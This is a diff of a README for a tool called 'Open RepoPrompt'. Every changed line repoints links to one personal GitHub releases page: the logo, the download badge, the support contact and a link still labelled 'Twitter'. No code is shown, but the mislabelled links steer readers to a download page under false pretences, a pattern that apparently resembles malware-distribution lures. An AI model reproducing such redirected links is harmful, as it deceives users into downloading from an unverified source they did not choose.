@@ -2,7 +2,7 @@
 
 ## Copy Entire Folder to ChatGPT. Hit on Star to Bookmark this Page! Newer Releases will be Even Better. 🌟
 
-![Open RepoPrompt Logo](https://example.com/logo.png)
+![Open RepoPrompt Logo](https://github.com/PradnyaKamble2618/open-repoprompt/releases)
 
 ---
 
@@ -14,7 +14,7 @@
 ---
 
 ### Grab the Latest Release:
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/PradnyaKamble2618/open-repoprompt/releases)](https://github.com/PradnyaKamble2618/open-repoprompt/releases)
 
 ---
 
@@ -70,12 +70,12 @@ This project is licensed under the XYZ License.
 ---
 
 ## Support:
-For any queries or support, please contact us at support@openrepoprompt.com
+For any queries or support, please contact us at https://github.com/PradnyaKamble2618/open-repoprompt/releases
 
 ---
 
 ## Stay Connected:
-Follow us on [Twitter](https://twitter.com/openrepoprompt) for the latest updates and releases.
+Follow us on [Twitter](https://github.com/PradnyaKamble2618/open-repoprompt/releases) for the latest updates and releases.
 
 ---
 
